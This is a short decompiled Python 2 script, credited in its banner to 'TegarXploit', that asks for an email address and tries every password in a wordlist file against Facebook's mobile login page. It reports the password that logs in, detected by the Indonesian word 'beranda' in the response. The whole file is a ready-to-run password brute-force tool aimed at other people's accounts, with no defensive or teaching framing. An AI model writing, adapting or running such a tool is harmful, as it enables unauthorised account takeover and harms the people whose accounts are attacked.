# uncompyle6 version 3.7.3
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
import requests, sys, os, time
os.system('clear')
time.sleep(2)
os.system('xdg-open https://m.youtube.com/channel/UC17ehoE84IzPzzipMddupSQ')
os.system('toilet -f mono9 -F gay WELCOME')
print '\x1b[32;1m===================================================='
print '\x1b[32;1m| \x1b[33;1mAUTHOR  : TegarXploit\t\t\t           |'
print '\x1b[32;1m| \x1b[33;1mYOUTUBE : CYTOM           \t\t\t   |'
print '\x1b[32;1m| \x1b[33;1mGITHUB  : https://github.com/TegarXploit         |'
print '\x1b[32;1m===================================================='
email = raw_input('email: ')
url = 'https://free.facebook.com/login.php'
ex = open('word.txt', 'r').readlines()
for line in ex:
    password = line.strip()
    http = requests.post(url, data={'email': email, 'pass': password, 'login': 'submit'})
    content = http.content
    if 'beranda' in content:
        print '\x1b[33;1m<+> password di temukan ==>', password
        sys.exit(2)
    else:
        print '\x1b[32;1m<!> password salah ==>', password